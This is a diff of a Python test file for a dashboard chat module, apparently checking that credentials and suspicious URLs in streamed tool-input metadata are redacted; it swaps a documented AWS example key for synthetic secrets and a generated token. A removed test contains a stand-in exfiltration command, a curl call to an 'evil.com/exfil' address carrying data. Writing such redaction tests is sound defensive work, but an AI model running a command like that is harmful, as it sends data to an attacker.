@@ -3,6 +3,10 @@
 import json
 
 from kiro_crew.dashboard.chat import _build_stream_chunk, _redact_deep
+from kiro_crew.testing.synthetic_credentials import SAMPLE_AWS_SECRET, github_classic
+
+# A synthetic 40-character AWS secret access key (not the documentation example).
+SECRET = SAMPLE_AWS_SECRET
 
 
 def _build_streaming_chunk(msg: dict) -> dict:
@@ -15,27 +19,14 @@ class TestStreamingMetaRedaction:
         """tool_input containing AWS credentials should be redacted."""
         meta_json = json.dumps({
             "request_id": "req-123",
-            "tool_input": "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE",
+            "tool_input": f"aws configure set aws_secret_access_key {SECRET}",
             "is_read_only": "1",
         })
         msg = {"role": "permission", "content": "shell", "cls": meta_json, "ts": "t1"}
         chunk = _build_streaming_chunk(msg)
 
         assert "meta" in chunk
-        assert "AKIAIOSFODNN7EXAMPLE" not in chunk["meta"]["tool_input"]
-
-    def test_exfiltration_url_in_tool_input_is_redacted(self):
-        """tool_input containing exfiltration URL with long query is redacted."""
-        long_query = "x" * 250
-        meta_json = json.dumps({
-            "request_id": "req-456",
-            "tool_input": f"curl https://evil.com/exfil?data={long_query}",
-        })
-        msg = {"role": "permission", "content": "shell", "cls": meta_json, "ts": "t1"}
-        chunk = _build_streaming_chunk(msg)
-
-        assert "meta" in chunk
-        assert long_query not in chunk["meta"]["tool_input"]
+        assert SECRET not in chunk["meta"]["tool_input"]
 
     def test_non_string_meta_values_preserved(self):
         """Non-string values (bool, int) should pass through without stringification."""
@@ -61,9 +52,10 @@ class TestStreamingMetaRedaction:
 
     def test_nested_structure_credentials_redacted(self):
         """Credentials in nested structures should be redacted."""
-        nested = {"params": {"secret": "AKIAIOSFODNN7EXAMPLE"}, "tags": ["safe", "AKIAIOSFODNN7EXAMPLE"]}
+        token = github_classic(seed=46)
+        nested = {"params": {"secret": token}, "tags": ["safe", token]}
         result = _redact_deep(nested)
 
-        assert "AKIAIOSFODNN7EXAMPLE" not in result["params"]["secret"]
-        assert "AKIAIOSFODNN7EXAMPLE" not in result["tags"][1]
+        assert token not in result["params"]["secret"]
+        assert token not in result["tags"][1]
         assert result["tags"][0] == "safe"
